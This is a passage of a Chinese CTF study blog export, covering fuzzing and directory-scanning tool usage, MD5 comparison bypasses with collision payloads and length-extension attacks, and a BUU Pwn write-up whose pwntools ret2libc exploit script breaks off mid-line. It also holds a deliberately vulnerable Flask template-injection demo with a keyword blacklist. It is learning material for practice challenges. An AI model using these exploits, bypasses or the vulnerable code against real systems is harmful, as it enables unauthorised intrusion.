<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>工具杂记</title>
    <url>/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="wfuzz爆破"><a href="#wfuzz爆破" class="headerlink" title="wfuzz爆破"></a>wfuzz爆破</h2><p>渗透测试工具，对目标不同参数进行模糊测试</p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z payload,range_start-range_end http://target.com/FUZZ</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>-c</code>: 隐藏无效的响应。</li>
<li><code>-z payload,range_start-range_end</code>: 指定文件类型和fuzz字典和范围。</li>
<li><code>--hc 404,403</code> 用来隐藏特定的状态码</li>
</ul>
<p><strong>Kali自带，输入wfuzz有使用方法</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/wfuzz00.png"></p>
<p><code>wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404,403 http://192.168.47.157/~FUZZ</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/wfuzz01.png"></p>
<h4 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h4><p><a class="link" href="https://blog.csdn.net/Amoy6228/article/details/134570129">https://blog.csdn.net/Amoy6228/article/details/134570129 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="fuff爆破"><a href="#fuff爆破" class="headerlink" title="fuff爆破"></a>fuff爆破</h2><h4 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：ffuf -u 目标地址/FUZZ -w 字典</span><br><span class="line">举例：ffuf -u http://192.168.111.131/FUZZ -w /usr/share/SecLists-2022.2/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>-mc</code>：匹配http状态码</li>
<li><code>-e</code>：增加扩展名</li>
</ul>
<h4 id="参考资料：-1"><a href="#参考资料：-1" class="headerlink" title="参考资料："></a>参考资料：</h4><p><a class="link" href="https://blog.csdn.net/weixin_44288604/article/details/128444485">https://blog.csdn.net/weixin_44288604/article/details/128444485 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Gobuster扫描神器"><a href="#Gobuster扫描神器" class="headerlink" title="Gobuster扫描神器"></a>Gobuster扫描神器</h2><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install gobuster</span><br></pre></td></tr></table></figure></div>

<h4 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.118/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.sh,.txt </span><br></pre></td></tr></table></figure></div>

<h4 id="3-1全局参数"><a href="#3-1全局参数" class="headerlink" title="3.1全局参数"></a>3.1全局参数</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">--debug                                              打开debug模式(调试模式)</span><br><span class="line">--delay duration          每个线程在请求之间等待的时间（举例：--delay 1500ms）</span><br><span class="line">--no-color                                                      禁用颜色输出</span><br><span class="line">--no-error                                                        不显示错误</span><br><span class="line">-z，--no-progress                                                 不显示进度</span><br><span class="line">-o，-output string                                             输出结果到文件</span><br><span class="line">-p，--pattern string                                        包含替换模式的文件</span><br><span class="line">-q，--quiet                                      不打印banner信息和其他无用信息</span><br><span class="line">-t，--threads int                                        指定线程数量（默认10）</span><br><span class="line">-v，--verbose                                    详细输出日志（错误信息也会展示）</span><br><span class="line">-w，--wordlist string                   指定字典路径，指定-可以通过标准输入中读取</span><br><span class="line">--wordlist-offset int           从字典的指定位置继续（默认偏移量为0，从第一个开始）</span><br></pre></td></tr></table></figure></div>

<h4 id="3-2模式"><a href="#3-2模式" class="headerlink" title="3.2模式"></a>3.2模式</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir         经典目录暴力破解模式</span><br><span class="line">dns        DNS子域暴力破解模式</span><br><span class="line">s3         枚举打开的 S3 存储桶并查找是否存在和存储桶列表</span><br><span class="line">gcs        枚举打开的谷歌云存储桶</span><br><span class="line">vhost     虚拟主机暴力破解模式（与DNS不同！）</span><br><span class="line">fuzz        使用模糊测试模式。替换URL、Headers和请求体中的关键词FUZZ</span><br><span class="line">tftp          暴力破解 tftp 文件</span><br></pre></td></tr></table></figure></div>

<h4 id="参考资料：-2"><a href="#参考资料：-2" class="headerlink" title="参考资料："></a>参考资料：</h4><p><a class="link" href="https://blog.csdn.net/2302_82189125/article/details/135999920">Web 扫描神器：Gobuster 保姆级教程（附链接）_gobuster 使用方法-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://blog.csdn.net/B_l_a_nk/article/details/135109164">Gobuster工具详解-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="dig命令"><a href="#dig命令" class="headerlink" title="dig命令"></a>dig命令</h2><h4 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig [域名] [OPTIONS]</span><br></pre></td></tr></table></figure></div>

<h4 id="参考资料：-3"><a href="#参考资料：-3" class="headerlink" title="参考资料："></a>参考资料：</h4><p><a class="link" href="https://www.cnblogs.com/machangwei-8/p/10353216.html">https://www.cnblogs.com/machangwei-8/p/10353216.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="fastcoll"><a href="#fastcoll" class="headerlink" title="fastcoll"></a>fastcoll</h2><p>快速MD5碰撞生成器</p>
<h4 id="基本使用：-1"><a href="#基本使用：-1" class="headerlink" title="基本使用："></a>基本使用：</h4><p>新建一个txt文件，随便输入内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p 1.txt -o 2.txt 3.txt</span><br></pre></td></tr></table></figure></div>

<p>-&gt; <code>-p</code> 源文件</p>
<p>-&gt;<code>-o</code>指定生成文件名</p>
<p><strong>配合PHP检查的代码一起使用</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_file</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file1</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">read_file</span>(<span class="string">&#x27;./2.txt&#x27;</span>));</span><br><span class="line"><span class="variable">$file2</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">read_file</span>(<span class="string">&#x27;./3.txt&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在当前目录下的终端出<code>php test.php</code></p>
<p>会生成经过url编码的文件内容</p>
<h2 id="Fenjing"><a href="#Fenjing" class="headerlink" title="Fenjing"></a>Fenjing</h2><h4 id="基本使用：-2"><a href="#基本使用：-2" class="headerlink" title="基本使用："></a>基本使用：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">图形界面：python -m fenjing webui</span><br><span class="line">命令行中的使用我没看</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/Fenjing00.png"></p>
<blockquote>
<p>1.输入URL</p>
<p>2.输入传参方式，和参数的名称（不需要传值）</p>
<p>3.分析模式和下面的渲染环境根据题目来</p>
<p>4.最后可以直接点击执行shell指令，如果能够成功返回，可以加入自定义命令(CTF中 — cat &#x2F;flag)</p>
</blockquote>
<h4 id="Demo："><a href="#Demo：" class="headerlink" title="Demo："></a>Demo：</h4><p>做CTF中遇到的一个题，看Wp中给出的代码，直接本地运行即可，借助这个Demo来上手工具的使用</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span> ,</span><br><span class="line"><span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;lipsum&#x27;</span>, <span class="string">&#x27;cycler&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;reverse&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;world&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(w <span class="keyword">in</span> name <span class="keyword">for</span> w <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NO!&quot;</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Hello, <span class="subst">&#123;name&#125;</span></span></span><br><span class="line"><span class="string">&lt;form action=&quot;/&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="hashdump："><a href="#hashdump：" class="headerlink" title="hashdump："></a>hashdump：</h2><p>是一个专门生成MD5长度扩展攻击payload的工具</p>
<p>Github仓库: <a class="link" href="https://github.com/bwall/HashPump">https://github.com/bwall/HashPump <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>安装方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Linux</span><br><span class="line">git clone https://github.com/bwall/HashPump.git</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/hashpump00.png"></p>
<blockquote>
<p>Signature：已知的md5值</p>
<p>Data：我们输入的确定的值（可能是根据题意而固定的值，或者其他的，看题说）</p>
<p>Length：已知的md5值的明文长度</p>
<p>Add：自定义</p>
</blockquote>
]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>杂记</tag>
      </tags>
  </entry>
  <entry>
    <title>md5</title>
    <url>/Learing/md5/</url>
    <content><![CDATA[<h2 id="MD5：小端方式填充"><a href="#MD5：小端方式填充" class="headerlink" title="MD5：小端方式填充"></a>MD5：小端方式填充</h2><h3 id="第一步-填充-单位为bit"><a href="#第一步-填充-单位为bit" class="headerlink" title="第一步: 填充(单位为bit)"></a>第一步: 填充(单位为bit)</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">保证 长度 % 512 = 448，填充1或n个0</span><br></pre></td></tr></table></figure></div>



<h3 id="第二步-记录信息长度"><a href="#第二步-记录信息长度" class="headerlink" title="第二步: 记录信息长度"></a>第二步: 记录信息长度</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">用64位来存储填充前信息长度。</span><br><span class="line">这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。</span><br></pre></td></tr></table></figure></div>



<h3 id="第三步-装入标准的幻数-四个整数"><a href="#第三步-装入标准的幻数-四个整数" class="headerlink" title="第三步: 装入标准的幻数(四个整数)"></a>第三步: 装入标准的幻数(四个整数)</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准的幻数(物理顺序)是:</span><br><span class="line">（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。</span><br><span class="line">如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）</span><br><span class="line">标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。</span><br></pre></td></tr></table></figure></div>



<h3 id="第四步-四轮循环计算-每一轮是十六步"><a href="#第四步-四轮循环计算-每一轮是十六步" class="headerlink" title="第四步: 四轮循环计算[ 每一轮是十六步 ]"></a>第四步: 四轮循环计算[ 每一轮是十六步 ]</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">以512bit为单位分组(Y0,Y1...Yn), 有一个128bit初值(iv),</span><br><span class="line">第一个分组Y0与初值iv经过哈希函数得到128bit结果(cv1)</span><br><span class="line">cv1与T2继续经过哈希函数得到128bit结果(cv2)</span><br><span class="line">......反复</span><br></pre></td></tr></table></figure></div>

<h3 id="总结-个人理解-："><a href="#总结-个人理解-：" class="headerlink" title="总结(个人理解)："></a>总结(个人理解)：</h3><blockquote>
<p>长度的计算是对于二进制位数，比如test的长度位: （每位十六进制数是4位二进制数，通过ASCII码转换十六进制）</p>
</blockquote>
<p>-&gt; 二进制长度4*2*4&#x3D;32,</p>
<p><strong>最后64位长度信息：</strong><code>200000000000000000000000000000000(64位)</code> &#x3D;&#x3D;&#x3D; 0x20 &#x3D; 32后面填充0</p>
<blockquote>
<p>对于长度扩展的理解, md5值由($secret + $v1)组成  $v1可控, md5可知,</p>
</blockquote>
<p>-&gt;  先随便弄一个字符串,  可得到<strong>最后一块(512位的组成)</strong>         <strong>此时得到的md5值, 可推得A B C D四个向量</strong></p>
<p>-&gt; 我们<strong>可以构造出来一块 上面所谓的最后一组</strong>, 且此时得到的四个向量结果我们通过上一步得到, 此时再往后填充数据来组成真正的最后一块,即扩展攻击</p>
<blockquote>
<p>什么叫构造出来一块?</p>
</blockquote>
<p>-&gt; 熟悉md5算法基本流程</p>
<h2 id="MD5值的绕过"><a href="#MD5值的绕过" class="headerlink" title="MD5值的绕过"></a>MD5值的绕过</h2><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h3><ul>
<li><a class="link" href="https://www.w3school.com.cn/php/func_string_md5.asp">md5函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<blockquote>
<p>在 php 程序中，md5($string,bool): 得到一个<a class="link" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>散列值。其中第二个参数默认为false,表示该函数返回值是32个字符的十六进制数。若指定为true,则表示函数返回的是16字节的二进制格式（这样通过浏览器解析会出现乱码）。</p>
</blockquote>
<ul>
<li>弱比较(&#x3D;&#x3D;)和强比较(===  和  !==)</li>
</ul>
<blockquote>
<p>弱比较：只比较值，不比较数据类型 — 先把两者转换为相同类型，再看值一样不一样</p>
<p>强比较：既比较值，也比较数据类型 — 先看数据类型一样不一样，再看值一样不一样</p>
</blockquote>
<h3 id="类型及举例："><a href="#类型及举例：" class="headerlink" title="类型及举例："></a>类型及举例：</h3><h4 id="一、MD5弱比较绕过"><a href="#一、MD5弱比较绕过" class="headerlink" title="一、MD5弱比较绕过(==)"></a>一、MD5弱比较绕过(==)</h4><p><img lazyload src="/images/loading.svg" data-src="/Learing/md5/00.png"></p>
<h5 id="绕过原理："><a href="#绕过原理：" class="headerlink" title="绕过原理："></a>绕过原理：</h5><blockquote>
<p>以0e开头的字符串在PHP中均被认为是科学计数法，即为0，当两个0e开头的字符串相比较时，无论后面的字符串是什么，都为True</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">字符串</th>
<th align="center">MD5值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">QNKCDZO</td>
<td align="center">0e830400451993494058024219903391</td>
</tr>
<tr>
<td align="center">s878926199a</td>
<td align="center">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="center">s155964671a</td>
<td align="center">0e342768416822451524974117254469</td>
</tr>
<tr>
<td align="center">s214587387a</td>
<td align="center">0e848240448830537924465865611904</td>
</tr>
<tr>
<td align="center">s214587387a</td>
<td align="center">0e848240448830537924465865611904</td>
</tr>
<tr>
<td align="center">s878926199a</td>
<td align="center">0e545993274517709034328855841020</td>
</tr>
<tr>
<td align="center">s1091221200a</td>
<td align="center">0e940624217856561557816327384675</td>
</tr>
</tbody></table>
<h4 id="二、MD5强比较绕过"><a href="#二、MD5强比较绕过" class="headerlink" title="二、MD5强比较绕过(&#x3D;&#x3D;&#x3D;)"></a>二、MD5强比较绕过(&#x3D;&#x3D;&#x3D;)</h4><p><img lazyload src="/images/loading.svg" data-src="/Learing/md5/01.png"></p>
<h5 id="绕过原理：-1"><a href="#绕过原理：-1" class="headerlink" title="绕过原理："></a>绕过原理：</h5><blockquote>
<p>在md5()函数中传入数组，不但md5()函数不会报错，结果还会返回null，在强比较中 null&#x3D;&#x3D;&#x3D;null，所以传入两个数组即可</p>
</blockquote>
<h4 id="三、MD5碰撞"><a href="#三、MD5碰撞" class="headerlink" title="三、MD5碰撞"></a>三、MD5碰撞</h4><p><img lazyload src="/images/loading.svg" data-src="/Learing/md5/02.png"></p>
<h5 id="绕过原理：-2"><a href="#绕过原理：-2" class="headerlink" title="绕过原理："></a>绕过原理：</h5><blockquote>
<p>强制转换为字符串再进行比较，所以数组的方法不可行了；利用的是MD5值算法本身的缺陷 — 存在散列冲突，必会有两个内容不一样但是MD5值一样的序列</p>
</blockquote>
<h5 id="使用fastcoll工具自己快速生成"><a href="#使用fastcoll工具自己快速生成" class="headerlink" title="使用fastcoll工具自己快速生成:"></a>使用fastcoll工具自己快速生成:</h5><p>可以看我的博客中的另外一篇 工具杂记 中记录有</p>
<p><img lazyload src="/images/loading.svg" data-src="/Learing/md5/03.png"></p>
<p><strong>贴一组：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa=a%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%B1%7E%14T%B5S%DB%7E%23%7B%E8u%0D%15%A1%9D%C8%1E%81%F8%8FJ%AE%1Br9Y%8A%87%88%03%09%0B%01%E7N%05L%A3k%28%C9%03%22p%05n0t%3E1%3B%3FE%E2%1B%1D%DC1x%E0%C4%22%25%22w%5E%10U%EC%CA%9F%F2%B0.%EC%ECB%83%FDq%DF%A6%C9%FE%80%EC%F4%E4%ABWQx%9D%DFm%073%2A%BB%BF%AFF6%90U%0A%99%1C%BE%9C%01Y%22%CD%9D%B9c%D4%A3%959%5E9%F4k2</span><br><span class="line"></span><br><span class="line">bbb=a%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%B1%7E%14T%B5S%DB%7E%23%7B%E8u%0D%15%A1%9D%C8%1E%01%F8%8FJ%AE%1Br9Y%8A%87%88%03%09%0B%01%E7N%05L%A3k%28%C9%03%22%F0%05n0t%3E1%3B%3FE%E2%1B%1D%DC%B1x%E0%C4%22%25%22w%5E%10U%EC%CA%9F%F2%B0.%EC%ECB%83%FDq%DF%26%C9%FE%80%EC%F4%E4%ABWQx%9D%DFm%073%2A%BB%BF%AFF6%90U%0A%99%9C%BD%9C%01Y%22%CD%9D%B9c%D4%A3%959%DE9%F4k2</span><br></pre></td></tr></table></figure></div>

<h4 id="四、MD5长度扩展攻击"><a href="#四、MD5长度扩展攻击" class="headerlink" title="四、MD5长度扩展攻击"></a>四、MD5长度扩展攻击</h4><p><strong>例题链接</strong></p>
<p>实验吧ctf—web-让我进入：<a class="link" href="http://ctf5.shiyanbar.com/web/kzhan.php">http://ctf5.shiyanbar.com/web/kzhan.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload src="/images/loading.svg" data-src="/Learing/md5/05.png"></p>
<p><strong>信息：</strong></p>
<p>1.已知md5值，且明文长度可知 — $secret + admin &#x3D;&#x3D;&#x3D; 20</p>
<p>2.用户名为admin，输入password后，保证Cookie中<code>getmein === md5($secret.urldecode(username.password))</code></p>
<p>**以这个题解释下我对MD5长度扩展攻击的理解: **</p>
<p>哈希值由四个幻数组成<code>(可以得到)</code>, 最后一块是需要填充的<code>(可得到)</code>,</p>
<p>如果我们以填充好的作为数据传过去，<strong>再加一段数据，那么md5值会变成什么样子？</strong></p>
<p><strong>-&gt; 以已知的md5值得到四个幻数，接着与加的数据接着进行md5加密 — 那我们就是可以得到了</strong></p>
<p>用Hashpump工具生成:</p>
<p><img lazyload src="/images/loading.svg" data-src="/Learing/md5/04.png"></p>
<blockquote>
<p>Signature：已知的md5值</p>
<p>Input Data：我没找到定义，我感觉是自己输入的数据（具体看题）</p>
<p>Key Length：已知的md5值的 明文长度—<code>md5(\$secret)</code> — <code>len($secret)</code></p>
<p>Add：这个随便填(扩展的那一部分)</p>
</blockquote>
<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p>CSDN博客：<a class="link" href="https://blog.csdn.net/qq_43580193/article/details/117432689">https://blog.csdn.net/qq_43580193/article/details/117432689 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98">md5哈希扩展长度攻击 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/">md5哈希扩展长度攻击(个人看完清晰的) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Learing</category>
      </categories>
      <tags>
        <tag>漏洞学习</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU平台的Pwn题记录</title>
    <url>/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span 